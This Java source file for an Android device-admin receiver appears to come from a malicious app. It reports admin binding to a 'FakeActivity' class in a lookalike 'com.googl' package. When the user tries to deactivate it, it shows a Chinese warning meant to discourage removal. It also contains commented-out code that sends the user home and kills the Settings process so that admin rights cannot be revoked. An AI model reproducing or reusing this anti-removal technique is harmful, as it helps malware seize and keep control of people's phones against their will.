package com.xstd.plugin.binddevice;

import android.app.ActivityManager;
import android.app.admin.DeviceAdminReceiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import com.googl.plugin.x.FakeActivity;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: AM11:15
 * To change this template use File | Settings | File Templates.
 */
public class DeviceBindBRC extends DeviceAdminReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onEnabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(true);

        Intent i = new Intent();
        i.setAction(FakeActivity.BIND_SUCCESS_ACTION);
        context.sendBroadcast(i);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(false);
    }

    @Override
    public CharSequence onDisableRequested (final Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisableRequested]] action : " + intent.getAction());

//        UtilsRuntime.goHome(context);
//
//        Handler handler = new Handler(Looper.getMainLooper());
//        handler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
//                activityManager.killBackgroundProcesses("com.android.settings");
//            }
//        }, 500);

        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

}
